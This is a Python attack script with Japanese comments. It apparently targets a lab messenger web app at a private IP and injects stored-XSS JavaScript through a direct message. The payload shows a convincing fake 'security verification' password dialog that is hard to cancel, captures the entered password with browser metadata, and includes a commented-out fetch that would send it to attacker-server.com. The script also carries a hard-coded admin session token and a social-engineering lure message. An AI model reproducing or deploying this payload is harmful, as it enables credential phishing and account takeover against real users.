#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib.parse
import json
import time

def create_advanced_phishing_payload():
    """
    より高度な偽のパスワード認証ダイアログのペイロードを作成
    """
    
    payload = """
    <script>
    // より高度なパスワードフィッシング攻撃
    (function() {
        var attackConfig = {
            triggerDelay: 2000, // 2秒後にダイアログを表示
            retryAttempts: 3,   // 3回まで再試行
            currentAttempt: 0
        };
        
        // DOMが読み込まれた後に実行
        document.addEventListener('DOMContentLoaded', function() {
            // 少し遅延を入れて自然に見せる
            setTimeout(function() {
                initializePhishingAttack();
            }, attackConfig.triggerDelay);
        });
        
        function initializePhishingAttack() {
            // 既存のダイアログがある場合は削除
            var existingDialog = document.getElementById('security-verification-dialog');
            if (existingDialog) {
                existingDialog.remove();
            }
            
            createAdvancedPasswordDialog();
        }
        
        function createAdvancedPasswordDialog() {
            // ページ全体を暗くするオーバーレイ
            var overlay = document.createElement('div');
            overlay.id = 'security-verification-dialog';
            overlay.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0, 0, 0, 0.85);
                z-index: 99999;
                display: flex;
                align-items: center;
                justify-content: center;
                animation: fadeIn 0.3s ease-in-out;
            `;
            
            // フェードインアニメーション
            var style = document.createElement('style');
            style.textContent = `
                @keyframes fadeIn {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }
                @keyframes shake {
                    0%, 100% { transform: translateX(0); }
                    25% { transform: translateX(-5px); }
                    75% { transform: translateX(5px); }
                }
                .shake { animation: shake 0.5s ease-in-out; }
            `;
            document.head.appendChild(style);
            
            // メインダイアログボックス
            var dialog = document.createElement('div');
            dialog.style.cssText = `
                background-color: #111111;
                border: 2px solid #00ff41;
                padding: 25px;
                max-width: 450px;
                width: 90%;
                color: #00ff41;
                font-family: 'Inconsolata', monospace;
                box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
                border-radius: 0;
                position: relative;
            `;
            
            // ダイアログの内容を作成
            dialog.innerHTML = `
                <div style="text-align: center; margin-bottom: 25px;">
                    <div style="color: #ff4444; font-size: 1.2em; margin-bottom: 10px;">⚠️ セキュリティ警告 ⚠️</div>
                    <h3 style="color: #00ff41; margin: 0 0 15px 0;">[TERMINAL X - SECURITY VERIFICATION]</h3>
                    <p style="margin: 0; line-height: 1.4; font-size: 0.95em;">
                        不正なアクセスが検出されました。<br>
                        セキュリティ保護のため、パスワードによる<br>
                        本人確認が必要です。
                    </p>
                </div>
                
                <div style="margin-bottom: 20px;">
                    <label style="display: block; margin-bottom: 8px; font-weight: bold;">
                        現在のパスワード:
                    </label>
                    <input type="password" id="security-password-input" style="
                        width: 100%;
                        padding: 12px;
                        background-color: #222;
                        border: 1px solid #00ff41;
                        color: #00ff41;
                        font-family: inherit;
                        box-sizing: border-box;
                        font-size: 1em;
                    " placeholder="パスワードを入力してください">
                </div>
                
                <div id="error-message" style="
                    color: #ff4444;
                    margin-bottom: 15px;
                    font-size: 0.9em;
                    text-align: center;
                    display: none;
                "></div>
                
                <div style="text-align: center;">
                    <button id="security-verify-btn" style="
                        background-color: transparent;
                        border: 2px solid #00ff41;
                        color: #00ff41;
                        padding: 12px 25px;
                        cursor: pointer;
                        font-family: inherit;
                        text-transform: uppercase;
                        margin-right: 15px;
                        font-size: 1em;
                    ">[認証実行]</button>
                    <button id="security-cancel-btn" style="
                        background-color: transparent;
                        border: 2px solid #666;
                        color: #666;
                        padding: 12px 25px;
                        cursor: pointer;
                        font-family: inherit;
                        text-transform: uppercase;
                        font-size: 1em;
                    ">[後で認証]</button>
                </div>
                
                <div style="margin-top: 20px; text-align: center; font-size: 0.8em; color: #666;">
                    タイムアウト: <span id="timeout-counter">60</span>秒
                </div>
            `;
            
            overlay.appendChild(dialog);
            document.body.appendChild(overlay);
            
            // パスワード入力欄にフォーカス
            var passwordInput = document.getElementById('security-password-input');
            passwordInput.focus();
            
            // タイムアウトカウンター
            var timeoutCounter = 60;
            var timeoutInterval = setInterval(function() {
                timeoutCounter--;
                var counterElement = document.getElementById('timeout-counter');
                if (counterElement) {
                    counterElement.textContent = timeoutCounter;
                }
                if (timeoutCounter <= 0) {
                    clearInterval(timeoutInterval);
                    showTimeoutMessage();
                }
            }, 1000);
            
            // 認証ボタンのクリックイベント
            document.getElementById('security-verify-btn').addEventListener('click', function() {
                var password = passwordInput.value;
                if (password.trim() === '') {
                    showErrorMessage('パスワードを入力してください。');
                    return;
                }
                
                // パスワード認証のシミュレーション
                showLoadingState();
                
                // 2秒後にパスワードを盗取して成功メッセージを表示
                setTimeout(function() {
                    clearInterval(timeoutInterval);
                    stealPasswordData(password);
                    showSuccessAndClose();
                }, 2000);
            });
            
            // キャンセルボタンのクリックイベント
            document.getElementById('security-cancel-btn').addEventListener('click', function() {
                clearInterval(timeoutInterval);
                showCancelWarning();
            });
            
            // Enterキーでの送信
            passwordInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    document.getElementById('security-verify-btn').click();
                }
            });
            
            // ESCキーでの終了を無効化
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') {
                    e.preventDefault();
                    showCancelWarning();
                }
            });
        }
        
        function showErrorMessage(message) {
            var errorElement = document.getElementById('error-message');
            if (errorElement) {
                errorElement.textContent = message;
                errorElement.style.display = 'block';
                
                // ダイアログを少し揺らす
                var dialog = errorElement.closest('div');
                dialog.classList.add('shake');
                setTimeout(function() {
                    dialog.classList.remove('shake');
                }, 500);
            }
        }
        
        function showLoadingState() {
            var verifyBtn = document.getElementById('security-verify-btn');
            var cancelBtn = document.getElementById('security-cancel-btn');
            var passwordInput = document.getElementById('security-password-input');
            
            if (verifyBtn) {
                verifyBtn.textContent = '[認証中...]';
                verifyBtn.disabled = true;
            }
            if (cancelBtn) {
                cancelBtn.disabled = true;
            }
            if (passwordInput) {
                passwordInput.disabled = true;
            }
        }
        
        function showSuccessAndClose() {
            var dialog = document.getElementById('security-verification-dialog');
            if (dialog) {
                dialog.innerHTML = `
                    <div style="
                        background-color: #111111;
                        border: 2px solid #00ff41;
                        padding: 25px;
                        max-width: 450px;
                        width: 90%;
                        color: #00ff41;
                        font-family: 'Inconsolata', monospace;
                        text-align: center;
                    ">
                        <div style="font-size: 1.2em; margin-bottom: 15px;">✅ 認証成功</div>
                        <p>パスワード認証が完了しました。<br>セキュリティ保護が有効になりました。</p>
                    </div>
                `;
                
                // 3秒後にダイアログを閉じる
                setTimeout(function() {
                    dialog.remove();
                }, 3000);
            }
        }
        
        function showCancelWarning() {
            attackConfig.currentAttempt++;
            
            if (attackConfig.currentAttempt < attackConfig.retryAttempts) {
                alert('セキュリティ認証をキャンセルすることはできません。\\n不正アクセスを防ぐため、認証を完了してください。');
                // 少し遅延してから再表示
                setTimeout(function() {
                    createAdvancedPasswordDialog();
                }, 1000);
            } else {
                var dialog = document.getElementById('security-verification-dialog');
                if (dialog) {
                    dialog.remove();
                }
                alert('認証がキャンセルされました。\\nセキュリティ上の理由により、アカウントが一時的に制限される可能性があります。');
            }
        }
        
        function showTimeoutMessage() {
            alert('認証タイムアウトです。\\nセキュリティ保護のため、再度認証してください。');
            createAdvancedPasswordDialog();
        }
        
        function stealPasswordData(password) {
            // パスワードを盗取（実際の攻撃では外部サーバーに送信）
            var stolenData = {
                password: password,
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                url: window.location.href,
                referrer: document.referrer
            };
            
            // コンソールに出力（デモ用）
            console.log('盗取されたパスワード情報:', stolenData);
            
            // ローカルストレージに保存（デモ用）
            localStorage.setItem('stolen_password_data', JSON.stringify(stolenData));
            
            // 実際の攻撃では外部サーバーに送信
            /*
            fetch('https://attacker-server.com/steal-password', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(stolenData)
            }).catch(function(error) {
                console.error('Data transmission failed:', error);
            });
            */
        }
        
    })();
    </script>
    """
    
    return payload

def send_advanced_phishing_message(session_id, recipient, target_url):
    """
    より高度な偽のパスワード認証ダイアログを表示するメッセージを送信
    """
    
    # 高度なペイロードを取得
    malicious_payload = create_advanced_phishing_payload()
    
    # 自然なメッセージに偽装
    message_content = f"""
    【重要】システム セキュリティ アップデート

    Terminal X システムのセキュリティ強化のため、
    緊急アップデートを実施しています。

    不正アクセスの可能性が検出されたため、
    全ユーザーの認証確認が必要です。

    このメッセージを確認後、自動的に
    認証画面が表示されます。

    {malicious_payload}
    """
    
    # POSTデータの準備
    post_data = {
        'action': 'transmit',
        'recipient': recipient,
        'message_content': message_content
    }
    
    # セッションIDを分割
    user_id, session_token = session_id.split(',', 1)
    
    # HTTPヘッダー設定
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': f'user_id={user_id}; session_id={session_token}',
        'Host': '192.168.49.128',
        'Origin': 'http://192.168.49.128',
        'Referer': 'http://192.168.49.128/hack/public/messenger.cgi',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
    }
    
    try:
        # HTTPリクエストを送信
        response = requests.post(
            target_url,
            data=post_data,
            headers=headers,
            timeout=10
        )
        
        print(f"[*] Status Code: {response.status_code}")
        
        if response.status_code == 200:
            if "Error:" in response.text:
                print(f"[!] Error detected in response")
                return False
            elif "Terminal X - Login" in response.text:
                print(f"[!] Session expired or invalid - redirected to login")
                return False
            else:
                print(f"[+] Advanced phishing message sent successfully!")
                return True
        else:
            print(f"[!] HTTP Error: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return False

def main():
    # 攻撃者のセッション情報
    attacker_session_id = "admin,c1d0f140842f7b8c1a766c86528124b3"
    
    # ターゲット情報
    target_url = "http://192.168.49.128/hack/public/messenger.cgi"
    victim_username = "user1"
    
    print(f"[*] Advanced Password Phishing Attack via DM")
    print(f"[*] Target URL: {target_url}")
    print(f"[*] Attacker Session ID: {attacker_session_id}")
    print(f"[*] Victim: {victim_username}")
    print(f"[*] " + "="*60)
    
    # 攻撃の詳細説明
    print(f"[*] Attack Details:")
    print(f"    - Creates a realistic fake password dialog")
    print(f"    - Includes security warnings and timeout counter")
    print(f"    - Prevents easy cancellation (retry mechanism)")
    print(f"    - Captures password and additional metadata")
    print(f"    - Shows success message to avoid suspicion")
    print(f"[*] " + "="*60)
    
    # セッションチェック
    print(f"[*] Checking session validity...")
    user_id, session_token = attacker_session_id.split(',', 1)
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Cookie': f'user_id={user_id}; session_id={session_token}',
        'Host': '192.168.49.128',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
    }
    
    try:
        response = requests.get(target_url, headers=headers, timeout=10)
        
        if "Terminal X - Login" in response.text:
            print(f"[!] Session is invalid or expired")
            return
        elif "SECURE_MESSENGER" in response.text:
            print(f"[+] Session is valid! Proceeding with advanced phishing attack...")
        else:
            print(f"[?] Unexpected response, but continuing...")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Session check failed: {e}")
        return
    
    # 高度なフィッシング攻撃を実行
    success = send_advanced_phishing_message(
        attacker_session_id,
        victim_username,
        target_url
    )
    
    if success:
        print(f"[+] Advanced phishing attack deployed successfully!")
        print(f"[*] Instructions for victim:")
        print(f"    1. Log into the system as '{victim_username}'")
        print(f"    2. Navigate to the messenger")
        print(f"    3. View the message from 'admin'")
        print(f"    4. A realistic password dialog will appear")
        print(f"    5. Enter password to see it get captured")
        print(f"[*] Captured data will be stored in browser console and localStorage")
        print(f"[*] Attack completed successfully!")
    else:
        print(f"[!] Attack failed!")

if __name__ == "__main__":
    main()
